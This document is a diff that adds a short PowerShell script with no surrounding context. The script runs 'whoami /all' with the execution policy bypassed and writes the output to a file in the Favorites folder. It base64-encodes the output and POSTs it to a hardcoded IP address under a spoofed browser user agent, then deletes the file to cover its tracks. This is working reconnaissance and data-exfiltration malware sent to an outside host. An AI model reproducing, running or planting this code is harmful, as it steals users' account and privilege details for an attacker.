@@ -1,0 +1,21 @@
+New-Item $pwd\Favorites\file.txt;
+PowErsHeLl -ep Bypass "whoami /all" > $pwd\Favorites\file.txt;
+$EncodedText = [convert]::ToBase64String((Get-Content -path $pwd\Favorites\file.txt -Encoding byte));
+$verb = "POST";
+$addr = "https://46.161.53.115/micr0answer"	;
+$webRequest = [System.Net.WebRequest]::Create($addr);
+$webRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
+$encodedContent = [System.Text.Encoding]::UTF8.GetBytes($EncodedText);
+$webRequest.Method = $verb;
+$webRequest.ContentLength = $encodedContent.length;
+$requestStream = $webRequest.GetRequestStream();
+$requestStream.Write($encodedContent, 0, $encodedContent.length);
+$requestStream.Close();
+	[System.Net.WebResponse] $resp = $webRequest.GetResponse();
+	if($resp -ne $null) 
+{
+    $rs = $resp.GetResponseStream();
+    [System.IO.StreamReader] $sr = New-Object System.IO.StreamReader -argumentList $rs;
+    [string] $results = $sr.ReadToEnd();
+}else {  exit ''}
+remove-item $pwd\Favorites\file.txt;
